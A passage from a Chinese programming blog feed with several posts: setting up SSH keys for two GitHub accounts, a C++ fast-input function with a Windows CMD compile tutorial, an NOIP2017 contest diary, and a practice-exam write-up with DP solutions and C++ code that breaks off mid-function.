<p>但是你实际在上传的时候，你的电脑里有两个秘钥，那么怎么才能根据实际情况去选择你想要上传的账号呢？这里就需要用到下面的配置文件，在 <code>~/ssh.</code> 文件夹下面新建一个文件叫  <code>config</code> 然后就按照下面的代码格式来写。其中，我的两个的命名本别是 Xorex 和 Katou-Megumi ，这里修改成你的就行了，注意 IdentityFile 填写的是你对应用户的 ssh 公钥地址，记得填对文件名。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Xorex</span></span><br><span class="line">Host Xorex.github.com</span><br><span class="line">HostName github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_Xorex</span><br><span class="line">user Xorex</span><br><span class="line"></span><br><span class="line"><span class="comment"># Katou-Megumi</span></span><br><span class="line">Host Katou-Megumi.github.com</span><br><span class="line">HostName github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa_Katou-Megumi</span><br><span class="line">user Katou-Megumi</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<ul>
<li>写完之后保存一下，然后可以分别通过指令 <code>ssh -T git@Xorex.github.com</code> 和 <code>ssh -T git@katou-megumi.github.com</code>来对所对应的github公钥进行连接。如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@Xorex.github.com</span><br><span class="line">Hi Xorex-chan! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br><span class="line">$ ssh -T git@Katou-Megumi.github.com</span><br><span class="line">Hi Megumi-Katou! You&#39;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
<ul>
<li>然后我就要提醒一下各位需要在一个电脑上面控制两个博客的朋友们，你们一定要记得，把博客配置文件里的 Git 地址给更换掉，不然不会成功的。</li>
</ul>
<p>比如下面的两个已经「折磨」我很久，需要修改成 <code>git@NewUser.github.com</code> 的地方。</p>
<p><img src="https://xorex.space/image/094.PNG"></p>
<p><img src="https://xorex.space/image/095.PNG"></p>
<blockquote>
<p>好了大概就这些了，我的博客就是因为搞两个 SSH 结果各种 Bug 层出不穷，所以特地来写一篇博客，希望有相同意向的程序员可以少走弯路，Ps：有问题可以来请教我，个人页面里留有 QQ 账号。</p>
</blockquote>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>快读和CMD教程</title>
    <url>/2017/12/19/2131c6a0d5c0/</url>
    <content><![CDATA[<blockquote>
<p>退役老年选手回报党和国家系列……</p>
</blockquote>
<h1 id="快读"><a href="#快读" class="headerlink" title="快读"></a>快读</h1><p>注意这个快读是非常的重要的，我想这应该是想要在OI这条路上走远的所有OIer必须会的东西，养成每次写题目都加上快读的好习惯，有可能会在关键的时候救你一命！</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">Read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> F=<span class="number">1</span>,Num=<span class="number">0</span>; <span class="comment">//F是记录数字是否为负数，Num存储读入的数字</span></span><br><span class="line">    <span class="keyword">char</span> ch=getchar(); <span class="comment">//getchar()读取一个字符</span></span><br><span class="line">    <span class="keyword">while</span>(!<span class="built_in">isdigit</span>(ch)) <span class="comment">//isdigit()判断是否为数字</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ch==<span class="string">&#x27;-&#x27;</span>) F=<span class="number">-1</span>; <span class="comment">//如果读入的字符是符号，标记F</span></span><br><span class="line">        ch=getchar(); <span class="comment">//继续读字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">isdigit</span>(ch)) <span class="comment">//如果当前读入的字符是数字，则将整个数字全部读入</span></span><br><span class="line">    &#123;</span><br><span class="line">        Num=Num*<span class="number">10</span>+ch-<span class="string">&#x27;0&#x27;</span>; <span class="comment">//将读入的ASCII字符转换为数字</span></span><br><span class="line">        <span class="comment">//或者上面的代码可以这样写:Num=(Num&lt;&lt;1)+(Num&lt;&lt;3)+ch-&#x27;0&#x27;;</span></span><br><span class="line">        ch=getchar(); <span class="comment">//读取下一个字符</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Num*F; <span class="comment">//将读取完毕的字符返回</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    a=Read();</span><br><span class="line">    b=Read();</span><br><span class="line">    <span class="comment">//读取a和b，等价于cin&gt;&gt;a&gt;&gt;b;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>此快读只能读入整形，如果要读入longlong就把快读里面int全部改成longlong</li>
</ul>
<h1 id="GDB教程"><a href="#GDB教程" class="headerlink" title="GDB教程"></a>GDB教程</h1><h2 id="VScode"><a href="#VScode" class="headerlink" title="VScode"></a>VScode</h2><p>首先推荐一个编辑器，来自微软的 Visual_Studio_Code 用熟练了根本改不回去……</p>
<p>下载地址：<a href="https://code.visualstudio.com/">Visual_Studio_Code下载</a></p>
<p>界面大概是这样的：<br><img src="https://xorex.space/image/079.png"></p>
<p>这个是编辑器，不能编译和运行，所以说需要配合着GDB使用。</p>
<p>注意新建文件的时候，需要加上后缀.cpp/.py/.c/.pas来表示文件类型。</p>
<h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>首先打开cmd，打开的方式可以直接在windows搜索栏里面输入cmd，打开就行了。</p>
<p><img src="https://xorex.space/image/080.png"></p>
<p>然后我们需要找到你代码的存放地址，建议在E盘建立一个叫做code(代码)或者自己名字缩写的文件夹，里面来存放代码。</p>
<p>首先需要输入坐在盘符，E盘就是<code>E:</code> 英文名称加上冒号。</p>
<p><img src="https://xorex.space/image/081.png"></p>
<p>然后打开文件夹，使用cd code 也就是<code>cd+空格+文件夹名称</code>。</p>
<p><img src="https://xorex.space/image/082.png"></p>
<p>如果进入错误的文件夹，使用<code>cd ..</code>可以退出。</p>
<p><img src="https://xorex.space/image/083.png"></p>
<p>定位到你代码所在的文件夹之后，你需要一个编译器，也就是G++文件，一般位置在 C:\mingwstudio\mingw\bin</p>
<p>所以你需要建立编译环境：set path=C:\mingwstudio\mingw\bin</p>
<p><img src="https://xorex.space/image/084.png"></p>
<p>这个编译环境是临时的，如果关闭cmd之后，下次打开是需要重新输入的。</p>
<p>现在你就可以编译了，编译是一条命令组成的：g++ -g <code>代码文件名称</code> -o <code>设定可执行文件名称</code></p>
<p>比如我要把P1001.cpp这个代码编译运行一下，可执行文件的名称叫做P1001，那么就输入：g++ -g P1001.cpp - P1001</p>
<p><img src="https://xorex.space/image/085.png"></p>
<p>如果像上面一样没有显示任何其他的东西，那么就是编译通过，成功生成了可执行文件P1001.exe</p>
<p><img src="https://xorex.space/image/086.png"></p>
<p>但是如果显示了和下面一样的东西，那么就是代码有问题了，出现了错误或者警告。</p>
<p><img src="https://xorex.space/image/087.png"></p>
<p>比如上面就是在声明变量的时候，没有加 <code>;</code> ，cmd会把你错误的行数显示出来，然后你需要改正，然后<strong>保存</strong>，注意一定要保存，习惯在写代码的时候使用Ctrl+S保存键……</p>
<p>再次编译就可以了，如下图。</p>
<p><img src="https://xorex.space/image/088.png"></p>
<p>然后输入P1001，也就是你生成的可执行文件的名字，会直接运行。</p>
<p>P1001是一个求平均分的题目，我们输入两个数x和y，按下回车就是结果了。</p>
<p><img src="https://xorex.space/image/089.png"></p>
<ul>
<li><p>如果同学们想使用考试版本的MinGW并体验新功能，这里有考试使用编译器版本MinGW4.8.4的包，下载下来之后，解压到C盘，然后搭建环境的时候输入成：set path=mingw\bin </p>
</li>
<li><p><a href="https://pan.baidu.com/s/1pLJujuN">百度网盘下载地址</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>CMD</tag>
        <tag>快读</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>NOIP2017总结</title>
    <url>/2017/11/29/3c3161ce6d44/</url>
    <content><![CDATA[<h1 id="NOIP2017游记"><a href="#NOIP2017游记" class="headerlink" title="NOIP2017游记"></a>NOIP2017游记</h1><h2 id="DAY1-2"><a href="#DAY1-2" class="headerlink" title="DAY1/2"></a>DAY1/2</h2><ul>
<li><p>到了郑州，有点小兴奋，然后就去河南省工业大学去试机，然后键盘很渣，电脑很渣……不过不得不说图书馆建造的是真的不错，非常大……</p>
</li>
<li><p>然后晚上回到宾馆，看到Roopesh同学关心我怎么样，我发了一下今天的所见所闻。而且今天还是Roopesh同学的生日，祝贺了他生日快乐……</p>
</li>
<li><p>晚上用PYT的笔记本电脑回顾了一下以前学过的算法模板之后就去睡觉了。其实内心并没有什么慌乱的感觉……反而有一些小小的期待。</p>
</li>
</ul>
<h2 id="DAY1"><a href="#DAY1" class="headerlink" title="DAY1"></a>DAY1</h2><ul>
<li><p>早上起得还算早，emmmmmm，然后呢早上和PYT同学一起悠闲悠闲的喝了一杯咖啡，然后开始启程。早上路过一家包子店，买了两个包子，然后发现非常难吃，而且有姜，于是决然的扔掉了，留下来一瓶果粒橙……</p>
</li>
<li><p>早上到了机房，然而并没有任何的紧张的感觉，然后就想往常一样，打开电脑，然后根据FTP拿到题目，安装软件，建立文件夹，似乎并没有任何问题。题目是math，complexity和park。数学，复杂度，公园。还好。</p>
</li>
<li><p>然后开始看题目，题目并没有什么不妥，感觉和普通的NOIP是一样。T1看着感觉不对，非常像数论，是来求两个数a和b可以组成的数中，不能组成的数中最大的是多少。范围是1e9。但是Exgcd好像并不能解决这个问题，自己想了很久一直没有任何的思路，然后就开始不停地思考和推导，于是战略性的暂时放弃……开始看T2，T2是一道大模拟，给你一段代码，让你用代码判断这个代码有没有什么问题，复杂度和给出的一样不一样……由于有些质疑自己的代码能力，所以就大致的看了看要求，直接开始看第三题，第三题题目描述死长死长的，耐着性子看完之后，大概就是一道图论题，让你求最短路+k范围内的路中，一共有多少条，是一道方案题，八成是DP写的，当时自己一眼秒出了想出了非常暴力的暴力，但是分数非常低……只有30分。</p>
</li>
<li><p>制定了一下战略顺序，首先写T1的暴力，然后写T3的暴力，然后写T2的正解，剩下的时间来想T1。制定之后立刻执行，手速写了T1和T3的暴力大概用了半个小时，此时比赛已经进行了一个小时了，我大概看了看周围，我旁边的一小兄弟还在看T1……感觉是个新手，写的还是Pascal。想起了高一来参加NOIP的时候的自己。然后认真的把T2的所有要求看了一遍，准备开始写，其实从这里开始，我就开始犯了致命的错误，我并没有写出来框架图，我并没有理清所有的思路并且尝试验证可行性，而是和以前一样，想着想到了哪里就去写哪里，这就导致了我写了一个半小时之后，通过了两个小样例，在测试大样例的时候，GG了，我遗忘了一种重要的可能性，而且我并没有认真的看数据范围，数据范围里面写的很清楚，我想的所有情况只能拿到40分的数据，怎么办？我重整思路，再次开始把没有想到的东西添加进去，用栈来模拟，这个程序的结构就注定这这样修改的困难是非常大的，自己改了半个小时，发现然而并不可以，Bug怎么都调不出来，无奈，上了一趟厕所，冷静了一下，此时距离考试结束就只剩下半个小时了，开始努力的想T1，发现并没有任何思路，各种数论方法都尝试了一遍全部不行。</p>
</li>
<li><p>考试最后十分钟，我把所有的东西都检查了一遍，然后打成包，释然的摊在桌在上，Day1挂掉了……60+40+30=130……出了门，帆神和澜神说T1是一道找规律的题目，只要打表大概就可以看出来公式是a*b-a-b了……我顿时愣住了，卧槽T1竟然考找规律，不应该是数论吗。不过Centruy同学和Cydiater好像写了EXGCD的解法，好像EXGCD也可以解？？？不过T1出这种题目真的真的很不负责任，不知道出题人为什么要出这种毫无技术含量的打表找规律的题目……</p>
</li>
<li><p>下午本来是要去郑州的小米之家的，但是因为实在是太懒了，所以就呆在宾馆里面玩了半个下午的三国杀，中途紫萱学姐还回来了，带着Switch，好有钱……然后就是玩弓箭手大作战，也没有复习算法什么的，一下午就过去了。然后不知道谁提议出去玩，就出去玩了，花了10块钱，玩了两个小时的绝地求生大逃杀……和yyh开黑，发现其实也是超级好玩的……</p>
</li>
<li><p>晚上很早就睡觉了，Day1就这样过去了，期望着Day2的翻盘……</p>
</li>
</ul>
<h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><ul>
<li><p>Day2早上早早地就去考场了，然后就和昨天一样，开始在FTP里面下载题目，cheese,treasure,phalanx，奶酪，宝藏，方阵……</p>
</li>
<li><p>然后就是开始看题，看到T1之后直接一眼秒，是有一块奶酪，和若干个球形的洞，两个洞如果有相切或者相交，那么就可以从其中一个洞到另外一个洞里面，问从奶酪底部到奶酪顶部是否存在联通的一个通路……这道题其实就建图，然后用DFS或者BFS遍历判断一下底部和顶部的连通性就可以了，我记得考试结束的时候Century告诉我用并查集也可以写（但是实际官方数据在评测的时候并查集被卡了40分……），看到这道题有些兴奋，因为这道题对于高一的同学来说是非常的不友好的，所以说一定会让很多的高一同学束手无策，自然加大了我拿到一等奖的概率。中途去上厕所遇到了cdcq，cdcq告诉我T1真的很良心，我说是啊，不过对高一很不友好，他们没有学过图论。cdcq好像没有听懂，可能他用的是并查集吧……T2是一道找最佳方案的题目，一道开通道路求最小权值，道路的权值是不确定的，根据你的开通方式就有不同的权值，直觉告诉我爆搜是可以写的，或者用贪心的方法Prim来写。但是考试的时候没有证明出来Prim正确性，反而找出了反例，所以就没有写，DFS没有想到具体的写法（当时可能是脑子短路了，其实DFS是非常的简单的而且有70分可以拿）然后就写了一个BFS的拓展（最后事实证明只有30分）。T3是一个方阵的题目，大概和体育课里面站成一个方阵是一样的。可以无脑拿到30分的大模拟……后面有x=1的情况也许可以用树状数组来解决。</p>
</li>
<li><p>我是按照T1，T2，T3的顺序写的，T1写的很顺利，emmmmmm我旁边的那位一直在看题……，T1手速写完之后开始写T2，T2也很快写完了，大概也就四五十分钟，然后写T3的模拟，写完之后开始写T3的x=1的情况，写了树状数组来维护一个队列，但是后来写着写着就不对了，然后找到了漏洞，但是想不出来用什么方法来解决这个漏洞，就一直在想……想了很长时间T3之后放弃了，开始想T2，T2用了各种方法都不行，最后尝试的用搜索+DP试试，然后手速写了出来，发现根本过不去样例，想了很久也没有找到为什么，可能这个DP本来就没有办法来做吧，考试就这样结束了，Day2同样实力爆炸……100+40+30=170……</p>
</li>
<li><p>然后就是去吃饭，吃了泡面（为了省钱）……然后就是整理好东西，准备回焦作了，突然想到，自己的OI生涯已经结束了啊，已经结束了……</p>
</li>
</ul>
<h1 id="NOIP结束之后"><a href="#NOIP结束之后" class="headerlink" title="NOIP结束之后"></a>NOIP结束之后</h1><ul>
<li><p>然后就是漫长的回班里面学习了，在这期间，根本学不进去，很难受，然后发现洛谷上面可以评测，等到选手下发程序之后我就开始在洛谷上面进行评测自己的程序，发现自己能拿190分，最后一题莫名RE，自己检查之后，发现自己的快速输入里面，少写了F=-1这一行，导致了直接死循环CE，但是考试的时候并没有RE啊，为什么会RE呢……然后找到了考场上面没有RE的原因，原来在文件输入输出的时候，少了F=-1的时候也是没有关系的，具体原因可以看我的知乎回答：<a href="https://www.zhihu.com/question/68312854/answer/261923588">传送门</a> 真的时候虚惊一场……当时觉得今年题目这么坑，一等分数线应该会往下降吧，自己还是很有希望的^</p>
</li>
<li><p>然后就是不知道从哪里弄来了学军中学的数据，在测试之后，成功GG1，50分，DAY1T1被卡成10分，DAY2T2卡成30分。顿时感觉绝望了……hopeless然后那几天心情一直很低落很低落……</p>
</li>
<li><p>接着就是正式数据出来的时候，突然就翻身了，215分，emmmmmmmm虽然不是太好但是也不差啊，有希望，但是57名也同样很危险……然后那几天就充满了希望……而且发现好像刘神T1被卡了40分之后，分数和我一样215，然后他不服就申诉了……</p>
</li>
<li><p>然后就是最终结果出来了，刚好被卡，我215，一等分数线220……二等奖第一名，想哭……</p>
</li>
</ul>
]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>感想</tag>
        <tag>NOIP</tag>
      </tags>
  </entry>
  <entry>
    <title>11-03考试总结</title>
    <url>/2017/11/03/e587f457e07d/</url>
    <content><![CDATA[<h1 id="考试状态"><a href="#考试状态" class="headerlink" title="考试状态"></a>考试状态</h1><blockquote>
<p>这次考试仍然很失败！</p>
</blockquote>
<ul>
<li>其实今天的考试状态是很糟糕的，首先我拿到T1之后就开始看，想着T1应该比较简单，然后就开始找规律，事实上这道题的规律是很难找到的，然后就不停的找规律找规律然。然而并没有找到任何规律，于是就想去写DP的式子，然后想了集中状态都没有办法找到状态转移的式子，这个时候考试已经过去了两个小时了，真的是严重的失误，于是就草草的写了DFS搜索枚举了所有的状态，打表写了70分。</li>
<li>这时候一个小时考试就结束了，然后就去看第二题，也没有心思沉下心来了，就想着超级裸的暴力，发现代码非常不好实现，于是就开始打表骗分，emmmmmm，其实这道题的规律是非常容易想出来了，但是T1用了两个半小时后我已经慌了，不想再写下去了，真是的，每次考试的时候我应该每次认真对待，就像这次考试是NOIP一样，无论难度如何，把自己能够拿到的分数拿到手，给每一道题目一定的时间思考，不要过度的浪费到同一道题目上面。</li>
<li>最后大概写了100分，GG，被各种大佬吊起来打……</li>
</ul>
<p>还有一些重要的东西，距离NOIP仅仅只剩下一个星期了，这一个星期我该干什么，我想我应该做出规划了：</p>
<ol>
<li><p>一个星期内，简单学一下数论和组合数学（认真脸，不能再拖了！）</p>
</li>
<li><p>然后就是再写一些模板题，各种算法的模板题，还有自己的blog，写了很多很多东西的，我要把里面的东西全部复习一遍，各种题目的思路全部再想一遍，代码就不码了，只记住模板就行了。</p>
</li>
<li><p>然后就是认真的对待每一次的考试，写好总结，加油！</p>
</li>
</ol>
<p>最后放上前两道题目的题解：</p>
<h1 id="兔子-rabbit"><a href="#兔子-rabbit" class="headerlink" title="兔子(rabbit)"></a>兔子(rabbit)</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>做一只明媚的兔子…</p>
</blockquote>
<ul>
<li>兔子都比较喜欢蹦蹦跳跳.但是蹦蹦跳跳的时候如果一直往高处跳的话就太累了,如果一直往低处跳的话就太无聊了.所以兔子希望跳的时候能够往上跳一步,往下跳一步,往上跳一步,往下跳一步….一共经过n个高度互不相同的位置(只要向上跳和向下跳相间分布就可以了,第一步可以往上跳也可以往下跳).如果下一个位置的高度比前一个位置高,就是往上跳,比前一个位置低,就是往下跳.</li>
<li>兔子今天又蹦蹦跳跳依次经过了n个位置.现在它想知道经过的n个位置的高度有多少种不同的可能.我们认为n个位置的高度形成了1到n的一个排列,这个排列要么满足奇数项的高度比相邻位置都大,要么满足偶数项的高度比相邻位置都大.</li>
</ul>
<ol>
<li>n=1时,有1种可能,就是这1个位置的高度为1</li>
<li>n=2时,有2种可能,可以是(1,2)或(2,1)</li>
<li>n=3时,有4种可能,(1,3,2) (2,3,1),(2,1,3),(3,1,2)</li>
</ol>
<p>答案可能很大,只需要输出答案对mod取模的结果.</p>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>一行两个整数n,mod</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>一行一个整数ans,表示所有可能的排列数目对mod取模后的结果.</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><ul>
<li><p>emmmmmm,其实这道题真的是DP里面比较难得一种了，无论是DP式子的状态转移还是状态设置，都不太好想，这道题需要两个DP式子，F[i][j]表示的是对于长度为i，第一个数字为j，且第一个数字比第二个数字大的数列的数量。G[i][j]表示的是对于长度为i，第一个数字为j，且第一个数字比第二个数字小的数列的数量，其中j&lt;=i。</p>
</li>
<li><p>那么我们可以这样想，对于一个长度为i-1，第一个数字为k（k&lt;j）且第一个数字小于第二个数字的数列来说，我们只要将 j 添加在这个数列的前面，那么我们就有了一个长度为i，第一个数字为j，且第一个数字大于第二个数字的数列。这个数列的数量就是F[i][j]，那么F[i][j]的转移式子就出来了：</p>
</li>
</ul>
<blockquote>
<p>F[i][j]=G[i-1][1]+G[i-1][2]+……+G[i-1][j-1];</p>
</blockquote>
<ul>
<li>那么对于G[i][j]的状态转移方程我们也可以用相同的思路去想，对于一个长度为i-1，第一个数字为k（j&lt;=k&lt;=i-1）且第一个数字大于第二个数字的数列来说，我们只需要将j添加在这个数列前面，就有了一个长度为i，第一个数字为j，且第一个数字小于第二个数字的数列，也就是G[i][j];</li>
</ul>
<blockquote>
<p>G[i][j]=F[i-1][j]+F[i-1][j+1]+……+F[i-1][i-1];</p>
</blockquote>
<ul>
<li>这里状态转移我们可以利用前缀和优化设置Fall[i][j]表示F[i][1]+F[i][2]+…..F[i][j]，同理Gall[i][j]表示G[i][1]+G[i][2]+……+G[i][j]，然后我们就可以O(i)转移F[i][j]和G[i][j]了。</li>
</ul>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n,Mod,ans;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> F[<span class="number">2001</span>][<span class="number">2001</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> G[<span class="number">2001</span>][<span class="number">2001</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> Fall[<span class="number">2</span>][<span class="number">2001</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> Gall[<span class="number">2</span>][<span class="number">2001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	freopen(<span class="string">&quot;rabbit.in&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="built_in">stdin</span>);</span><br><span class="line">	freopen(<span class="string">&quot;rabbit.out&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="built_in">stdout</span>);</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;Mod;</span><br><span class="line">	Gall[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">	Fall[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">	&#123;</span><br><span class="line">		F[i][j]=Gall[(i<span class="number">-1</span>)&amp;<span class="literal">true</span>][j<span class="number">-1</span>];</span><br><span class="line">		G[i][j]=(Fall[(i<span class="number">-1</span>)&amp;<span class="literal">true</span>][i<span class="number">-1</span>]-Fall[(i<span class="number">-1</span>)&amp;<span class="literal">true</span>][j<span class="number">-1</span>]+Mod)%Mod;</span><br><span class="line">		Fall[i&amp;<span class="literal">true</span>][j]=(Fall[i&amp;<span class="literal">true</span>][j<span class="number">-1</span>]+F[i][j])%Mod;</span><br><span class="line">		Gall[i&amp;<span class="literal">true</span>][j]=(Gall[i&amp;<span class="literal">true</span>][j<span class="number">-1</span>]+G[i][j])%Mod;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	ans=(ans+F[n][i]+G[n][i])%Mod;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="literal">true</span>) ans=<span class="literal">true</span>;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="被子-quilt"><a href="#被子-quilt" class="headerlink" title="被子(quilt)"></a>被子(quilt)</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>作为一只明媚的兔子,需要学会叠被子…</p>
</blockquote>
<ul>
<li>被子是方形的,上面有很多小写字母.可以认为被子是一个n*m的字符矩阵被子能够被叠起来,当且仅当每一行,每一列都是回文串.兔子可以把同一条被子上任意两个位置的字母交换位置,而且兔子不嫌麻烦,为了把被子叠起来它愿意交换任意多次.但是兔子不能交换两条不同的被子之间的字母.</li>
<li>现在兔子翻箱倒柜找出来了很多被子,请你帮兔子判断每条被子能否被叠起来.</li>
</ul>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><ol>
<li><p>第一行一个Q,表示被子的条数</p>
</li>
<li><p>接下来描述Q条被子.</p>
</li>
<li><p>描述每条被子时,第一行输入两个整数n,m表示由n行m列组成</p>
</li>
<li><p>接下来n行每行一个长度为m的字符串.字符串中只含小写字母.</p>
</li>
</ol>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>Q行,依次输出对每条被子的判断结果.如果可以叠起来,输出一行“Yes”(不包括引号),如果叠不起来,输出一行“No”(不包括引号).</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><ul>
<li>其实这道题是非常简单的，不过细节有些多，所以需要好好想想其中有四种情况：</li>
</ul>
<ol>
<li><p>n和m都是偶数，那么所有字符的出现次数必须是4的倍数，否则输出”No”.</p>
</li>
<li><p>n是偶数，m是奇数，然后就判断不能有字符出现次数为奇数，如果有输出”No”，然后去掉所有的4的倍数，枚举累加2的倍数，要求累加和要小于等于n。</p>
</li>
<li><p>n是奇数，m是偶数，然后就判断不能有字符出现次数为奇数，如果有输出”No”，然后去掉所有的4的倍数，枚举累加2的倍数，要求累加和要小于等于m。</p>
</li>
<li><p>n是奇数，m是奇数，所有字符出现次数只能有一个为奇数，否则输出”no”，然后累加非4倍数的%4值，如果超过m+n-2，那么输出”No，”否则输出”Yes”。</p>
</li>
</ol>
<p>其实就是一道找规律的题目，超级简单，只不过需要注意细节问题，想明白所有的情况，思路需要比较广！</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> Maxx=<span class="number">30</span>;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">2000</span>][<span class="number">2000</span>];</span><br><span class="line"><span class="keyword">int</span> n,vis[<span class="number">40</span>],Num;</span><br><span class="line"><span class="keyword">int</span> m,all,This;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solve_First</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    <span class="keyword">if</span>(vis[i]%<span class="number">4</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solve_Second</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Num=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    <span class="keyword">if</span>(vis[i]&amp;<span class="literal">true</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    vis[i]=vis[i]&gt;&gt;<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=Maxx;i++)</span><br><span class="line">    <span class="keyword">if</span>(vis[i]&amp;<span class="literal">true</span>) Num++;</span><br><span class="line">    <span class="keyword">if</span>(Num&gt;(n&gt;&gt;<span class="literal">true</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;No&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Yes&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Solve_Third</span><span 